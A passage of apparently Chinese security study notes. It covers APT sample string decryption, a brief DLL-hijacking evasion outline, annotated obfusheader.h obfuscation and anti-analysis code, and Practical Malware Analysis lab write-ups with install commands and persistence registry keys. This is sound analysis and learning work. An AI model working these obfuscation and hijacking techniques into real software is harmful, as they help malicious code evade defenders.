(isalpha(*v9)) { if ((*v9 \u003e= 'a') \u0026\u0026 (*v9 \u003c= 'z')) { *v9 = (*v9 - '_') % 26 + 'a'; } else if ((*v9 \u003e= 'A') \u0026\u0026 (*v9 \u003c= 'Z')) { *v9 = (*v9 - '?') % 26 + 'A'; } } else if (isdigit(*v9)) { *v9 = (*v9 - '.') % 10 + '0'; } v9++; } } int main() { char test1[50] = \"A:\\\\npmepykbyry\\\\ugljgqr.jme\"; char test2[50] = \"0\"; process_buffer(test1, test1 + strlen(test1)); process_buffer(test2, test2 + strlen(test2)); printf(\"%s %s\", test1, test2); return 0; } 执行结果为：C:\\programdata\\winlist.log 2（正常解密结果为C:\\programdata\\winlist.log）\n同样发方法，后面的解密字符串为emj.cqgpns\\\\yrybkypempn\\\\:A（C:\\programdata\\uprise.log），rvr.cryb\\\\yrybkypempn\\\\:A（C:\\programdata\\date.txt），rvr.ppc\\\\yrybkypempn\\\\:A（C:\\programdata\\err.txt）\n获取系统时间，将系统时间转为时间戳，获取计算机名称，获取用户名称：\nGetSystemTime(\u0026SystemTime); SystemTimeToFileTime(\u0026SystemTime, \u0026FileTime); nSize = 512; GetComputerNameW(Buffer, \u0026nSize); nSize = 512; GetUserNameW(aErr_1, \u0026nSize); 之后在特定的目录下找特定的文件，不过它的字符串的变换操作我没有看明白。而且与之前倒转字符串的函数很相似，都有与0x7FFFFFFFFFFFFFFE进行比较之类的操作。\n后面的行为与之前的一个函数也比较相似，似乎是对高精度时间进行的操作：\nperf_frequency = Query_perf_frequency(); perf_counter = Query_perf_counter(); "},"title":"APTs"},"/docs/remaining/bypass/":{"data":{"":"","#":"DLL劫持 导入要劫持的DLL，使用AheadLib+生成模板 在入口函数处编写payload 将转发DLL放到原DLL同目录下，并将原DLL改名 "},"title":"Bypass"},"/docs/remaining/itemlearn/":{"data":{"":"","#":"obfusheader.h 真的不菜\nOBFUSCATION\n伪造假的段名称，也就是伪签名\n不过这个伪造似乎对我的die影响不大（话说die不是更具特征码识别保护的吗？）\n#if FAKE_SIGNATURES \u0026\u0026 defined(_WINDOWS) \u0026\u0026 !KERNEL_MODE #ifdef _MSC_VER #pragma section(\".arch\") #pragma section(\".srdata\") #pragma section(\".xpdata\") #pragma section(\".xdata\") #pragma section(\".xtls\") #pragma section(\".themida\") #pragma section(\".vmp0\") #pragma section(\".vmp1\") #pragma section(\".vmp2\") #pragma section(\".enigma1\") #pragma section(\".enigma2\") #pragma section(\".dsstext\") #endif // https://enigmaprotector.com FAKE_SIG(_enigma1, \".enigma1\", 0); FAKE_SIG(_enigma2, \".enigma2\", 0); // https://vmpsoft.com (opensource) FAKE_SIG(_vmp1, \".vmp0\", 0); FAKE_SIG(_vmp2, \".vmp1\", 0); FAKE_SIG(_vmp3, \".vmp2\", 0); // DENUVO FAKE_SIG(_denuvo1, \".arch\", 0); FAKE_SIG(_denuvo2, \".srdata\", 0); FAKE_SIG(_denuvo3, \".xdata\", 0); FAKE_SIG(_denuvo4, \".xpdata\", 0); FAKE_SIG(_denuvo5, \".xtls\", \"\\x64\\x65\\x6E\\x75\\x76\\x6F\\x5F\\x61\\x74\\x64\\x00\\x00\\x00\\x00\\x00\\x00\"); // THEMIDA FAKE_SIG(_themida1, \".themida\", 0); // SECUROM FAKE_SIG(_securom1, \".dsstext\", 0); #endif 生成随机数种子\n关键字constexpr：变量或函数的值可以在编译时确定。\n__TIME__：在编译时被替换为一个字符串，表示源代码被编译的时间。\n__LINE__：编译时被替换为当前源代码的行号。\n__COUNTER__：在这个代码中是每次调用CTimeSeed后都会增加1。\n#ifdef __cplusplus // using constexpr allows us to avoid embeding XX:XX:XX into the binary static constexpr int CTime = __TIME__[0] + __TIME__[1] + __TIME__[3] + __TIME__[4] + __TIME__[6] + __TIME__[7]; //将编译的时间求和 #define CTimeSeed ((__COUNTER__ + CTime) * 2654435761u) //斐波那契散列常数吗？ #else // for C we cannot base it on __TIME__, since there's no constexpr, or XX:XX:XX will be added to the binary #define CTimeSeed ((__COUNTER__ + __LINE__) * 2654435761u) #endif #define RND(Min, Max) (Min + (CTimeSeed % (Max - Min + 1))) 混淆的真假异或门\n不管这个RND(1, 10)（从1到10之间随机取一个数）取多少，下面的真还是真，假也是假，和自己实现了一个异或门。\n#define _RND RND(1, 10) #define _TRUE ((((_9 + __7() + ((_RND * __2()) * __0()))) / _8) - _1) #define _FALSE ((_3 + __6() + ((_RND * __3()) * _0)) - __9()) #define XOR(x, y) (x + y - (2 * (x \u0026 y))) 定义静态字符串\n应该是不让直接搜索出来字符串吧，不过后面的定义类似函数的数字确实很有用，ida直接升天。\n// Use stored in static memory essential bytes for hardcoded cflow blocks \u0026 expressions #if CFLOW_CONST_DECRYPTION || CFLOW_BRANCHING static volatile char _a = 'a', _b = 'b', _c = 'c', _d = 'd', _e = 'e', _f = 'f', _g = 'g', _h = 'h', _i = 'i', _j = 'j', _k = 'k', _l = 'l', _m = 'm', _n = 'n', _o = 'o', _p = 'p', _q = 'q', _r = 'r', _s = 's', _t = 't', _u = 'u', _v = 'v', _w = 'w', _x = 'x', _y = 'y', _z = 'z', _S = 'S', _L = 'L', _A = 'A', _I = 'I', _D = 'D', _P = 'P'; static volatile char _0 = 0, _1 = 1, _2 = 2, _3 = 3, _4 = 4, _5 = 5, _6 = 6, _7 = 7, _8 = 8, _9 = 9; // Same trick with NOINLINED functions (proxies) static NOINLINE char __0() { return 0; } static NOINLINE char __1() { return 1; } static NOINLINE char __2() { return 2; } static NOINLINE char __3() { return 3; } static NOINLINE char __4() { return 4; } static NOINLINE char __5() { return 5; } static NOINLINE char __6() { return 6; } static NOINLINE char __7() { return 7; } static NOINLINE char __8() { return 8; } static NOINLINE char __9() { return 9; } #endif 构造真假判断\n// Easily build hardcoded control-flow protection blocks #define BLOCK_COND(cond, block) if (cond) { block; } #define BLOCK_TRUE(block) BLOCK_COND(_TRUE, block) //if (true) { block; }也就是恒执行 #define BLOCK_FALSE(block) BLOCK_COND(_FALSE, block) //自然是恒不执行 反静态分析\n其实就是添加恒跳转的花指令，如下：\nxor eax, eax jz loc_real _emit 0x00 loc_real: 混淆\n读取0到0x7FFFFF中的随机一个值的地址，有可能会发生段错误。\n下面定义的int_proxy函数其实就是参数是多少就返回多少，一个混淆。\n#define SEGFAULT int_proxy(*(int*)RND(0, 0x7FFFFF)) #if CFLOW_CONST_DECRYPTION || CFLOW_BRANCHING volatile static INLINE int int_proxy(double val) { INDIRECT_BRANCH; volatile double a = val * ((double)_7 - ((double)_3 * 2)); BLOCK_TRUE( BLOCK_FALSE( return _RND; ) ) BLOCK_TRUE( loc_end: if (_RND) return a * _TRUE; loc_fake: return _RND; ) } #endif 嘲讽\n其实就是构造了一个假函数，然后……并不会执行到这。\nstatic void obfusheader_watermark_hook(const char* param) {} // to avoid crashing we assign a real func typedef volatile void(*draw_ptr) (const char*); // define a draw function static volatile draw_ptr obfusheader_watermark_orig = (draw_ptr)obfusheader_watermark_hook; // assign draw_orig to avoid segfault // Binary watermarking for IDA/GHIDRA that bypasses compiler optimizations #define WATERMARK(...)\\ const char * data[] = {__VA_ARGS__};\\ for (volatile int i = 0; i \u003csizeof(data)/sizeof(data[0]); i++)\\ obfusheader_watermark_orig(data[i]); static volatile void obfusheader_decoy_main() { WATERMARK(\"Stop reversing the binary\", // Message for crackers ;) \"Reconsider your life choices\", \"And go touch some grass\", 0); } // Fake decoy functions to hide the original one (for call hiding) static void obfusheader_decoy_1() { obfusheader_decoy_main(); } static void obfusheader_decoy_2() { obfusheader_decoy_main(); } static void obfusheader_decoy_3() { obfusheader_decoy_main(); } static void obfusheader_decoy_4() { obfusheader_decoy_main(); } static void obfusheader_decoy_5() { obfusheader_decoy_main(); } static void obfusheader_decoy_6() { obfusheader_decoy_main(); } static void obfusheader_decoy_7() { obfusheader_decoy_main(); } static void obfusheader_decoy_8() { obfusheader_decoy_main(); } static void obfusheader_decoy_9() { obfusheader_decoy_main(); } static void obfusheader_decoy_10() { obfusheader_decoy_main(); } 加密与解密\nobfuscator加密应该就是简单的数据与key异或的运算\n// Normal \u0026 threadlocal encryption modes #define OBF_KEY_NORMAL(x, type, size, key) []() {\\ constexpr static auto result = obf::obfuscator\u003ctype, size, key\u003e(x);\\ return result; }() //调用lambda表达式，只有宏没有名称，进行加密 #define OBF_KEY_THREADLOCAL(x, type, size, key) []() {\\ constexpr static auto data = obf::obfuscator\u003ctype, size, key\u003e(x);\\ thread_local auto decryptor = obf::decryptor\u003ctype, size, key\u003e(data);\\ return decryptor; }() //线程中都有一个解密实例，在线程中解密 #define MAKEOBF_NORMAL(x) OBF_KEY_NORMAL(x, obf::clean_type\u003cdecltype(obf::gettype(x))\u003e, obf::getsize(x), (char)RND(1, 255)) #define MAKEOBF_THREADLOCAL(x) OBF_KEY_THREADLOCAL(x, obf::clean_type\u003cdecltype(obf::gettype(x))\u003e, obf::getsize(x), (char)RND(1, 255)) //生成密钥 #if CONST_ENCRYPTION #if CONST_ENCRYPT_MODE == NORMAL #define MAKEOBF(x) MAKEOBF_NORMAL(x) #elif CONST_ENCRYPT_MODE == THREADLOCAL #define MAKEOBF(x) MAKEOBF_THREADLOCAL(x) #endif #define OBF(x) ((meta::decay_t\u003cdecltype(x)\u003e) MAKEOBF(x)) #else #define MAKEOBF(x) x #define OBF(x) x #endif 后面的命名空间似乎是对编译文件的一些操作，就先跳过\n又一个混淆\n之前的那个永真if与永假if以及自己实现的异或，进行挨个与key+i进行异或操作\ntemplate \u003cclass T, char key, size_t size\u003e INLINE void xord(T* data) { #if CFLOW_CONST_DECRYPTION for (volatile int i = 0; i \u003c size; i++) { BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 1)); //不执行 ) BLOCK_TRUE( //int_proxy之前分析的就是输入几输出就是几 BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 2)); //不执行 ); BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 3)); //不执行 ); BLOCK_TRUE( data[i] = XOR(data[i], CAST(T, int_proxy(key + i))); // real ) ) BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 4)); //不执行 ) } #else for (volatile int i = 0; i \u003c size; i++) data[i] = data[i] ^ CAST(T, key + i); // no cflow (optimized+unsafe) #endif } 还是一个异或与解密\n实现了单值与多值两个版本，异或加密与异或解密\ntemplate \u003cclass T, size_t size, char key\u003e class obfuscator { public: constexpr obfuscator(const T* data) { for (int i = 0; i \u003c size; i++) m_data[i] = data[i] ^ CAST(T, key + i); } constexpr obfuscator(const T data) { m_data[0] = data ^ key; } INLINE T* decrypt() { //解密 if (!decrypted) { xord\u003cT, key, size\u003e(m_data); } decrypted = true; return m_data; } INLINE operator T* () { return decrypt(); } INLINE operator T () { return decrypt()[0]; } bool decrypted = false; T m_data[size]{}; }; template \u003cclass T, size_t size, char key\u003e class decryptor { public: INLINE decryptor(const obfuscator\u003cT, size, key\u003e data) { for (int i = 0; i \u003c size; i++) m_data[i] = data.m_data[i]; //将加密数据从obfuscator转移过来 } INLINE T* decrypt() { //解密 if (!decrypted) { xord\u003cT, key, size\u003e(m_data); } decrypted = true; return m_data; } INLINE operator T* () { return decrypt(); } INLINE operator T () { return decrypt()[0]; } bool decrypted = false; T m_data[size]{}; }; 隐藏函数指针\n创建了一个函数地址的数组，里面有随机数，假函数地址，数组最后一个是真函数地址。然后有两种寻找函数地址的方式，如果index == real_index则返回数组中第N个（是真的地址，因为数组长度为N+1），否则返回第index个。\ntemplate \u003ctypename T, int N, int real_index, T real_value, int index\u003e constexpr T select_func() { T funcs[N + 1] = { RCAST(T, (char*)_RND), RCAST(T, obfusheader_decoy_1), RCAST(T, obfusheader_decoy_2), RCAST(T, obfusheader_decoy_3), RCAST(T, (char*)_RND), RCAST(T, 0), RCAST(T, (char*)_RND), RCAST(T, obfusheader_decoy_5), RCAST(T, (char*)_RND), RCAST(T, (char*)_RND), RCAST(T, real_value) }; if (index == real_index) // Index of the real func return funcs[N]; return reinterpret_cast\u003cT\u003e(funcs[index]); } template \u003ctypename T, int N, int real_index, T real_value, int... indices\u003e struct FunctionPtrHider { static T shuffled_arr[N]; }; template \u003ctypename T, int N, int real_index, T real_value, int... indices\u003e T FunctionPtrHider\u003cT, N, real_index, real_value, indices...\u003e::shuffled_arr[N] = { select_func\u003cT, N, real_index, real_value, indices\u003e()... }; 在c里面直接禁用混淆：\n#else // C doesn't support compile-time encryption cause no constexpr sadly :( So we just implement it like this \u0026 disable everything #define OBF(x) x #define CALL(ptr, ...) ((ptr)(__VA_ARGS__)) #define HIDE_PTR(ptr) (ptr) 符号调用隐藏\nlinux与安卓平台使用动态链接库函数dlsym从默认符号表中查找符号，windows平台就load要用的dll之后GetProcAddress就可以找到了。（避免在代码中硬编码函数地址IAT）\n// Symbol - based call hiding(different for Linux\u0026 windows) #if defined(__linux__) || defined(__ANDROID__) #define CALL_EXPORT(mtd, def) ((def)(dlsym(RTLD_DEFAULT, OBF(mtd)))) #elif defined(_WINDOWS) #define CALL_EXPORT(lib, mtd, def) ((def)(GetProcAddress(LoadLibraryA(lib), mtd))) #endif #endif 影响性能的混淆\n其实就是将这些常用的条件跳转与返回自己实现了一个混淆的版本\n#if CFLOW_BRANCHING #define if(x) if (_TRUE) if (int_proxy((long long)(x)) * _TRUE \u0026\u0026 _RND) #define for(x) for (int _i=0; _i\u003cint_proxy(_TRUE);_i++) for (x) #define while(x) while(int_proxy((long long)(x)) * _TRUE \u0026\u0026 _RND) #define switch(x) switch(int_proxy((long long)(x)) * _TRUE) #define return for (int _i=0; _i\u003cRND(1, 100);_i++) return // This will hurt (Some compilers don't allow this, disable if fails) #define else else\\ BLOCK_FALSE(\\ int_proxy(_RND);\\ BLOCK_TRUE(\\ int_proxy(_RND);\\ )\\ ) else #endif MODULES\n其实就是自己实现了一些常用的字符串操作的函数\nXAntiDebug 真的不菜\n这个反调试代码函数XAD_Initialize为反调试初始化，XAD_ExecuteDetect函数为检测调试。先看初始化吧\n1"},"title":"ItemLearn"},"/docs/remaining/lab/":{"data":{"":"","恶意代码分析实战的实验#《恶意代码分析实战》的实验":"Lab 1-1 ---------------- Lab01-01.exe Lab01-01.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、这些文件是什么时候编译的？ 3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？ 4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？ 5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？ 6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？ 7、你猜这些文件的目的是干什么的？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 1.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 2.png)\n通过pe工具查看时间戳，发现两个文件的编译时间：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 3.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 4.png)\n两个文件都用die查一下壳：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 5.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 6.png)\n发现二者没有壳，但是关于这个dll文件没有导出表：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 7.png)\n看一下exe文件的导入表，就是这个文件用了哪些系统函数：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 8.png)\n这两个API的功能是通常用于枚举指定目录中的文件。\n用记事本打开exe文件可以看到可能对C:\\Windows\\System32\\Kernel32.dll进行了某些操作：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 9.png)\n同样用记事本打开dll文件，可以看到一个ip地址：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 10.png)\n创造一个后门什么的吧🥲\nLab 1-2 ---------------- Lab01-02.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。 3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？ 4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 11.png)\n用die查壳发现是upx壳，在这个网址下载upx加壳器后将对应文件放到目录下后输入脱壳指令：\nupx -d Lab01-02.exe 额，就好了。\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 12.png)\n用记事本打开程序：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 13.png)\n可以看到一个一个网址，恶意代码可能是想连接到该网址。\nLab 1-3 ---------------- Lab01-03.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。 3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？ 4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 14.png)\n将exe文件拖入linxerUnpacker中，单击\"壳特征脱壳\"，成功脱壳。\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 15.png)\n用记事本打开程序：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 16.png)\n可以看到一个一个网址。\nLab 1-4 ---------------- Lab01-04.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？ 2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。 3、这个文件是什么时候被编译的？ 4、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？ 5、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？ 6、这个文件在资源段中包含一个资源，使用Restorator工具来检查资源，然后抽取资源。从资源中你能发现什么吗？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 17.png)\n用die查看一下，没有壳吧，但发现一个PE资源，可以使用：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 18.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 22.png)\n全选后转储出来。\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 19.png)\n在导入表中找到如下函数：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 20.png)\n这个api是从网络上下载文件并保存到本地的一个操作。\n用记事本打开拿个我们转储的文件，可以看到一个网址，可能是用上面那个api下载了这个程序：\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 21.png)\n好吧，第二步好像已经抽取完资源了，官方文档。\nLab 3-1 ---------------- Lab03-01.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、找出这个恶意代码的导入函数与字符串列表？ 2、这个恶意代码在主机上的感染特征是什么？ 3、这个恶意代码是否存在一些有用的网络特征码？如果存在，他们是什么？ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 使用die查看导入表，发现只有一个函数：\n![image](https://c65mael.github.io/static/myassets-Lab/3-1 1.png)\nExitProcess是退出进程相关的api函数，字符串可以找到如下：\nSOFTWARE\\Classes\\http\\shell\\open\\commandV Software\\Microsoft\\Active Setup\\Installed Components\\ www.practicalmalwareanalysis.com SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders SOFTWARE\\Classes\\http\\shell\\open\\command\n用途：\n这个注册表路径定义了系统如何处理 http 协议的链接。 command 子键包含一个字符串值，指定了当用户点击一个 HTTP 链接时要执行的命令。 分析：\n浏览器默认应用程序设置：通常，这里会设置为某个浏览器的可执行文件路径，比如 C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe。 恶意软件可能会修改这个键，以便劫持 HTTP 链接，重定向到恶意网站或执行恶意程序。 *Software\\Microsoft\\Active Setup\\Installed Components*\n用途：\nActive Setup 用于在用户登录时执行配置任务和更新。 Installed Components 下的每个子键对应一个已安装的组件，这些组件可以在用户首次登录时执行特定的配置操作。 分析：\n系统组件和应用程序可能会在此注册表路径下创建子键，以便在用户登录时执行特定任务。 恶意软件也可能利用这个路径，在用户登录时执行恶意代码。 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n用途：\n这个注册表路径包含的子键定义了在用户登录时自动启动的程序。 每个子键的名称是启动项的名称，值是要执行的程序的路径。 分析：\n合法的启动项：例如，防病毒软件、驱动程序相关程序、即时通讯软件等。 恶意软件常常在这里添加启动项，以便在用户每次登录时自动运行其恶意代码。 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\n用途：\n这个注册表路径定义了用户外壳文件夹的位置，如桌面、我的文档、收藏夹等。 子键和值对应了系统和用户特定的文件夹路径。 所使用的句柄表：\n![image](https://c65mael.github.io/static/myassets-Lab/3-1 2.png)\n听说它创建了一个互斥体，但是我运行起来进程就退出了，没有看到有互斥体。（可能是什么反调试？）\n不明白\n恶意软件解析了域名www.practicalmalwareanalysis.com\nLab 3-2 ---------------- Lab03-02.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 实验内容： 1、你怎么样让这个恶意代码自行安装？ 2、在安装之后，你如何让这个恶意代码运行起来？ 3、你怎么能找到这个恶意代码是在哪个进程下运行的？ 4、你可以在Process Monitor工具中设置什么样的过滤器，才能收集这个恶意代码的信息？ 5、这个恶意代码在主机上的感染迹象特征是什么？ 6、这个恶意代码是否存在一些有用的网络特征码 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 使用die看一下导出表：\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 1.png)\n这个dll可能是使用install函数进行安装的，再看一下导入表：\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 2.png)\n可以看到一些对注册表操作的api和一些关于服务的相关操作，还有关于http的相关操作：\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 3.png)\n搜索字符串可以看到，有一个叫svchost的exe文件，有可能是shellcode加载器\n安装dll指令：\nrundll32.exe Lab03-02.dll,installA 使用如下命令启动：\nnet start IPRIP 多次运行安装指令，可以发现有多个名为svchost.exe的进程：\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 5.png)\n而且这些进程的ID号最小的只有一个680的，其他ID的进程则是软件创建的。\n因为dll是需要exe加载运行，所以我们设置Process Name为dll名字是无效的,而我们这里的Process Name是svchost.exe，但是系统中有很多的svchost.exe导致我们不好定位，这里解决的办法是得到进程的pid\n查看软件的字符串：\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 4.png)\n可以看到对应的解析域名，访问的http\nLab 3-3 主要的文件操作：\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 1.png)\n不理解为什么有一堆A，用die查看导入表，可以发现有写进程内存的函数，推测有对应的操作：\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 2.png)\nLab 3-4 运行后有自删除操作。\n导入表中导入了WS2_32.dll，可能有与网络交互操作。\n分析软件行为时发现调用了cmd.exe，这个指令应该是自我删除吧：\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 3.png)\n其余的基本操作：\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 4.png)\n下面的操作都需要使用ida了\nLab 5-1 ---------------- Lab05-01.dll ---------------- 使用工具： 1. IDA Pro -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 1、DllMain的地址是什么？ 2、使用Imports窗口并浏览到的gethostbyname，导入函数定位到什么地址？ 3、有多少函数调用了gethostbyname？ 4、将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？ 5、IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？ 6、IDA Pro识别了在0x10001656处的子过程中的多少个参数？ 7、使用Strings窗口，来在反汇编中定位字符串\\cmd.exe /c 。它位于哪？ 8、在引用\\cmd.exe /c的代码所在的区域发生了什么？ 9、在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= DllMain的地址：0x1000D02E\n.idata:100163CC\nctrl+x找交叉引用：\n![image](https://c65mael.github.io/static/myassets-Lab/5-1 1.png)\n这个名为[This is RDO]pics.praticalmalwareanalysis.com将会被调用：\n![image](https://c65mael.github.io/static/myassets-Lab/5-1 2.png)\n如下：\n.text:10001656 ; =============== S U B R O U T I N E ======================================= .text:10001656 .text:10001656 .text:10001656 ; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter) .text:10001656 sub_10001656 proc near ; DATA XREF: DllMain(x,x,x)+C8↓o .text:10001656 .text:10001656 var_675 = byte ptr -675h .text:10001656 var_674 = dword ptr -674h .text:10001656 hModule = dword ptr -670h .text:10001656 timeout = timeval ptr -66Ch .text:10001656 name = sockaddr ptr -664h .text:10001656 var_654 = word ptr -654h .text:10001656 in = in_addr ptr -650h .text:10001656 Str1 = byte ptr -644h .text:10001656 var_640 = byte ptr -640h .text:10001656 CommandLine = byte ptr -63Fh .text:10001656 Str = byte ptr -63Dh .text:10001656 var_638 = byte ptr -638h .text:10001656 var_637 = byte ptr -637h .text:10001656 var_544 = byte ptr -544h .text:10001656 var_50C = dword ptr -50Ch .text:10001656 var_500 = byte ptr -500h .text:10001656 Buf2 = byte ptr -4FCh .text:10001656 readfds = fd_set ptr -4BCh .text:10001656 buf = byte ptr -3B8h .text:10001656 var_3B0 = dword ptr -3B0h .text:10001656 var_1A4 = dword ptr -1A4h .text:10001656 var_194 = dword ptr -194h .text:10001656 WSAData = WSAData ptr -190h .text:10001656 lpThreadParameter= dword ptr 4 DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)一个参数\nxdoors_d:10095B34 aCmdExeC db '\\cmd.exe /c ',0 ; DATA XREF: sub_1000FF58+278↑o 可以看到一系列的linux指令，可能就是模拟Linux shell：\n![image](https://c65mael.github.io/static/myassets-Lab/5-1 3.png)\n获取版本消息：\n.text:10003695 ; =============== S U B R O U T I N E ======================================= .text:10003695 .text:10003695 ; Attributes: bp-based frame .text:10003695 .text:10003695 ; BOOL sub_10003695() .text:10003695 sub_10003695 proc near ; CODE XREF: sub_10001656+1D↑p .text:10003695 ; sub_10003B75+7↓p ... .text:10003695 .text:10003695 VersionInformation= _OSVERSIONINFOA ptr -94h .text:10003695 .text:10003695 push ebp .text:10003696 mov ebp, esp .text:10003698 sub esp, 94h .text:1000369E lea eax, [ebp+VersionInformation] .text:100036A4 mov [ebp+VersionInformation.dwOSVersionInfoSize], 94h .text:100036AE push eax ; lpVersionInformation .text:100036AF call ds:GetVersionExA .text:100036B5 xor eax, eax .text:100036B7 cmp [ebp+VersionInformation.dwPlatformId], 2 .text:100036BE setz al .text:100036C1 leave .text:100036C2 retn .text:100036C2 sub_10003695 endp 可能会检查程序是否在Windows NT 4.0或更早的时候运行这些版本有不同的平台ID,而不是后期版本的Windows。这个对于那些不设计以更新版本的旧程序来说是有用的窗户。\nLab 6-1 main函数的主要逻辑如下：\nint sub_401000() { BOOL ConnectedState; // [esp+0h] [ebp-4h] ConnectedState = InternetGetConnectedState(0, 0); if ( ConnectedState ) { sub_40105F(aSuccessInterne, ConnectedState); return 1; } else { sub_40105F(aError11NoInter, 0); return 0; } } 在0x40105f中，函数逻辑像从某某读取内容的操作。\n整个函数逻辑大概为先检查网络是否连接，如果连接，则读取字符串Success: Internet Connection并打印；如果无法连接，则读取字符串Error 1.1: No Internet并打印\nLab 6-2 main函数的主要逻辑如下：\nint 